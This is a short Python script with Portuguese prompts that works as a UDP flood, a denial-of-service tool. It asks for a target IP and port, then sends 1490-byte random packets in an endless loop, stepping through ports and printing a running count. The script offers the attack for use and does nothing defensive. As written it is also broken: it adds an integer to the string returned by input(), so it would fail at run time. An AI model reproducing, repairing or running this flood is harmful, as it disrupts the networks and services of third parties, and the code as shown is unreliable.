import socket,random
#############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
ip = input("Alvo : ")
port = input("Porta: ")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent {} packet to {} throught port:{}".format(sent,ip,port))
     if port == 65534:
       port = 1

